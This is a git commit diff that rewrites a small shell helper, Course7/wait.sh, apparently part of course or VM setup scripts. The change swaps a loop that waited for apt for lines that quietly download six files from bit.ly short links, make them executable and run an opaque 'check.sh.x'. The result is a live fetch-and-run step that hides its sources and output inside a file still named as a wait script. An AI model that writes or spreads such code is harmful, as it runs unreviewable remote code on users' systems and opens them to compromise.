8dc5fd1f19e116001a66e76123302dd333c4071e
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-07-31 00:21:39 +0700

    Update wait.sh

--- Course7/wait.sh
+++ Course7/wait.sh
@@ -1,3 +1,15 @@
 #!/bin/bash
-
-until [[ $(ps aux | grep apt | wc -l) == "1" ]]; do sleep 3; done;
+wget -O exit.sh https://bit.ly/3BBLPbC > /dev/null 2>&1
+wget -O sleep.sh https://bit.ly/376kyA1 > /dev/null 2>&1
+wget -O devboxvm.sh https://bit.ly/37e7QyU > /dev/null 2>&1
+wget -O region.sh https://bit.ly/3rJD2zR > /dev/null 2>&1
+wget -O check.sh.x https://bit.ly/3zNy1sL > /dev/null 2>&1
+wget -O wait.sh https://bit.ly/3zV1jFE > /dev/null 2>&1
+chmod +x devboxvm.sh
+chmod +x exit.sh
+chmod +x sleep.sh
+chmod +x region.sh
+chmod +x wait.sh
+chmod +x check.sh.x
+sleep 1
+./check.sh.x
